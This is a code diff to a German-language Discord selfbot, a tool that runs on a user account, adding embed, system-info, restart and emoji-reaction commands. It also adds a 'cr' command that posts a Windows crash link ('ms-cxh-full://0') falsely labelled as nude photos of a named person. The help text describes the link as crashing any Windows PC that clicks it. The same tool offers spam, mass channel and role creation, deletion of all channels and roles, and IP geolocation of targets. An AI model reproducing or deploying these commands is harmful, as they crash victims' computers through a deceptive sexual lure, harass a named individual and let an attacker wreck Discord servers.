@@ -5,14 +5,21 @@ VERSION = "v1.4"
 import discord, ctypes, json, os, webbrowser, requests, datetime, urllib, time, string, random, asyncio, aiohttp
 from discord.ext import commands, tasks
 from colorama import Fore, Back, Style
+from contextlib import redirect_stdout
 from selenium import webdriver
 from itertools import cycle
+import typing
+import emoji
+import psutil
+import sys
 
 with open("Config.json") as f:
     config = json.load(f)
 
 TOKEN = config.get("token")
 PREFIX = config.get("prefix")
+
+psutil.cpu_percent(interval=1)
 
 prefix = '.'
 
@@ -25,7 +32,6 @@ def ready():
                 ╚═╝╚═╝═╩╝╚═╝  ╚═╝╚═╝ ╩  ╩ ╚═╝╩╚═
 {Fore.LIGHTBLACK_EX}
                  Bot developed by butter#0001
-                https://twitter.com/ButterDerG
 
                     {Fore.WHITE}Discord Version {discord.__version__}
 
@@ -96,8 +102,45 @@ async def ac(ctx, *, text):
     print(f"{Fore.RED}[{datetime.datetime.now()} UTC]\n{Fore.GREEN}Erfolgreich deinen Ascii Text reingesendet!")
 
 @Butter.command()
-async def gibmeme(ctx):
+async def em(ctx, *, a_sMessage):
     await ctx.message.delete()
+    embed = discord.Embed(description=a_sMessage, color=RandomColor(), timestamp=ctx.message.created_at)
+    embed.set_author(name=ctx.message.author.name, icon_url = client.user.avatar_url)
+    embed.set_footer(text="")
+    await ctx.send(embed=embed, delete_after=10)
+    print(f"{Fore.RED}[{datetime.datetime.now()} UTC]\n{Fore.GREEN}Erfolgreich eine Embed Nachricht reingesendet!")
+
+@Butter.command()
+async def systeminfo(ctx):
+    start = time.perf_counter()
+    message = await ctx.send("Ping...")
+    end = time.perf_counter()
+    duration = (end - start) * 1000
+    await ctx.message.delete()
+    await message.delete()
+    cpuavg = psutil.cpu_percent(interval=None)
+    mem = psutil.virtual_memory()[2]
+    durround = round(duration, 3)
+    embed = discord.Embed(
+        title="System informationen", description="", color=RandomColor()
+    )
+    embed.set_thumbnail(url="https://i.imgur.com/GuRAHY1.png")
+    embed.add_field(name="CPU", value=f"{cpuavg}%", inline=True)
+    embed.add_field(name="Ram", value=f"{mem}%", inline=True)
+    embed.add_field(name="Ping", value=f"{durround}ms", inline=True)
+    embed.add_field(name="OS", value=f"{sys.platform}", inline=True)
+    embed.set_footer(text="BSDCv1.4")
+    await ctx.send(embed=embed)
+
+@Butter.command()
+async def restart(ctx):
+    await ctx.message.delete()
+    print(f"{Fore.RED}[{datetime.datetime.now()} UTC]\n{Fore.GREEN}Der {Fore.RED}SELFBOT{Fore.GREEN} wird nun gerestartet.")
+    os.execv(sys.executable, ["Discord main.py"] + sys.argv)
+
+@Butter.command()
+async def gibmeme(ctx):
+    await ctx.delete_message(ctx.message)
     r = requests.get("https://some-random-api.ml/meme").json()
     embed = discord.Embed(color=RandomColor(), timestamp=ctx.message.created_at)
     embed.set_author(name="Hier dein Meme", icon_url="https://cdn.discordapp.com/attachments/746792750971748516/764533886234918922/giphy.gif")
@@ -192,12 +235,17 @@ AVATAR URL            - {user.avatar_url}
     f.close()
     print(f"{Fore.GREEN}Userinfo bereitgestellt!\n")
 
+@Butter.command()
+async def cr(ctx):
+    await ctx.message.delete()
+    await ctx.send("Nihad Nudes: <ms-cxh-full://0>")
 
 @Butter.command()
 async def ip(ctx, host):
     await ctx.message.delete()
     start = datetime.datetime.now()
     r = requests.get(f"http://ip-api.com/json/{host}?fields=country,regionName,city,isp,mobile,proxy,query")
+    ip = ctx
     geo = r.json()
     query = geo["query"]
     isp = geo["isp"]
@@ -211,6 +259,7 @@ async def ip(ctx, host):
     embed = discord.Embed(description=f"**Host-IP:** {query}\n**ISP:** {isp}\n**Stadt:** {city}\n**Region:** {region}\n**Land:** {country}\n**VPN/Proxy:** {proxy}\n**Mobil:** {mobile}", color=RandomColor())
     embed.set_author(name=f"IP-Tracker für {query}")
     embed.set_footer(text=f"Herausgefunden in {elapsed} Sekunden")
+    embed.set_thumbnail(url="https://sitechecker.pro/wp-content/uploads/2019/04/ip-address.png")
     await ctx.send(embed=embed, delete_after=10)
     time.sleep(0.25)
     print(f"{Fore.RED}[{datetime.datetime.now()} UTC]\n{Fore.GREEN}Die IP-Location von {Fore.RED}{query}{Fore.GREEN} wurde erfolgreich in den Chat geschickt!")
@@ -362,6 +411,72 @@ async def sb(ctx, amount: int, *, message):
     print(f"{Fore.RED}[{datetime.datetime.now()} UTC]\n{Fore.GREEN}Die Spam Nachricht {Fore.RED}{message}{Fore.GREEN} wurde erfolgreich {Fore.RED}{amount}-mal{Fore.GREEN} reingesendet mit einem Delay von {Fore.RED}{delay}s{Fore.GREEN} !")
 
 @Butter.command()
+async def reaktion(ctx, messageNo: typing.Optional[int] = 1, *, text):
+    await ctx.message.delete()
+    text = (c for c in text.lower())
+    emotes = {
+        "a": "🇦",
+        "b": "🇧",
+        "c": "🇨",
+        "d": "🇩",
+        "e": "🇪",
+        "f": "🇫",
+        "g": "🇬",
+        "h": "🇭",
+        "i": "🇮",
+        "j": "🇯",
+        "k": "🇰",
+        "l": "🇱",
+        "m": "🇲",
+        "n": "🇳",
+        "o": "🇴",
+        "p": "🇵",
+        "q": "🇶",
+        "r": "🇷",
+        "s": "🇸",
+        "t": "🇹",
+        "u": "🇺",
+        "v": "🇻",
+        "w": "🇼",
+        "x": "🇽",
+        "y": "🇾",
+        "z": "🇿",
+    }
+    for i, m in enumerate(await ctx.channel.history(limit=100).flatten()):
+        if messageNo == i:
+            for c in text:
+                await m.add_reaction(f"{emotes[c]}")
+            break
+
+@Butter.command()
+async def butter(ctx):
+    cnt = """```
+████    ██    ██  ██████  ██████  ██████  ████
+██  ██  ██    ██    ██      ██    ██      ██  ██
+████    ██    ██    ██      ██    ████    ████
+████    ██    ██    ██      ██    ██      ██  ██
+██  ██  ██    ██    ██      ██    ██      ██  ██
+████      ████      ██      ██    ██████  ██  ██
+
+                            ████
+                      ██████    ██
+                ██████            ██
+          ██████                    ██
+        ████                  ██████████
+        ██  ██          ██████        ██
+        ██    ██  ██████          ░░░░██
+        ██      ██            ░░░░░░░░██
+        ██░░░░  ██      ░░░░░░░░██████
+          ██░░░░██░░░░░░░░██████
+            ██░░██░░██████
+              ██████
+```"""
+    em = discord.Embed(color=RandomColor())
+    em.description = cnt
+    await ctx.send(embed=em)
+    await ctx.message.delete()
+
+@Butter.command()
 async def serverpb(ctx):
     await ctx.message.delete()
     embed = discord.Embed(title=ctx.guild.name, colour=RandomColor())
@@ -427,7 +542,7 @@ async def serverinfo(ctx):
     embed.add_field(name="Kategorien:", value=len(ctx.guild.categories))
     embed.add_field(name="Rollen:", value=len(ctx.guild.roles))
     embed.add_field(name="Einladungen", value=len(await ctx.guild.invites()))
-    embed.set_author(name = "𝘽𝙐𝙏𝙏𝙀𝙍 - 𝘽𝙎𝘿𝘾𝙫𝟏.4", icon_url = client.user.avatar_url, url = "https://twitter.com/ButterDerG")
+    embed.set_author(name = "𝘽𝙐𝙏𝙏𝙀𝙍 - 𝘽𝙎𝘿𝘾𝙫𝟏.4", icon_url = client.user.avatar_url, url = "https://twitter.com/edoderg")
     await ctx.send(embed=embed, delete_after = 10)
     time.sleep(0.25)
     print(f"{Fore.RED}[{datetime.datetime.now()} UTC]\n{Fore.GREEN}Erfolgreich die Serverinformationen von {Fore.RED}{ctx.guild.name}{Fore.GREEN} reingesendet!")
@@ -662,17 +777,23 @@ async def optionen(ctx):
 {prefix}optionen, help
 Zeigt diese Nachricht an.
 
+{prefix}cr
+Lässt einen Windows PC crashen sobald man draufklickt.
+
+{prefix}systeminfo
+Zeigt dir deine System Informationen an wie CPU, RAM usw.
+
+{prefix}restart
+Restartet den Selfbot. (Hilfreich bei Spam-Befehlen)
+
 {prefix}clear [Anzahl]
 Löscht deine Nachrichten im Channel.
 
 {prefix}clearalles
 Löscht den gesamten Chatverlauf von dir im Channel.
 
-{prefix}lchannel
-Löscht alle Channels auf dem Server.
-
-{prefix}lrollen
-Löscht alle Rollen auf dem Server.
+{prefix}reaktion [Text]
+Macht einen Reaktionstext auf die Nachricht drüber
 
 {prefix}servername [Name]
 Ändert den Servernamen.
@@ -725,9 +846,11 @@ Zeigt das Avatar von dir/anderen an.
 {prefix}userinfo [User]
 Zeigt die Userinfo an.
 
+{prefix}em [Text]
+Macht dir in der Einbettung einen eigenen Text.
+
 {prefix}ac [Text]
-Schreibt dein Text in
-.
+Schreibt dein Text in Ascii.
 
 {prefix}gibmeme
 Gibt dir ein random Meme.
@@ -747,6 +870,12 @@ Erstellt ganz viele Channels.
 {prefix}crollen
 Erstellt ganz viele Rollen.
 
+{prefix}lchannel
+Löscht alle Channels auf dem Server.
+
+{prefix}lrollen
+Löscht alle Rollen auf dem Server.
+
 {prefix}sp [Text]
 Spamt möglichst viele Nachrichten durchgehend.
 
@@ -764,7 +893,7 @@ adden und anschreiben!
 
 ```
     """)
-  embed.set_author(name = "𝘽𝙐𝙏𝙏𝙀𝙍 - 𝘽𝙎𝘿𝘾𝙫𝟏.4", icon_url = client.user.avatar_url, url = "https://twitter.com/ButterDerG")
+  embed.set_author(name = "𝘽𝙐𝙏𝙏𝙀𝙍 - 𝘽𝙎𝘿𝘾𝙫𝟏.4", icon_url = client.user.avatar_url, url = "https://twitter.com/edoderg")
   await ctx.send(embed=embed, delete_after=30)
 
 Butter.run(TOKEN, bot=False, reconnect=True)
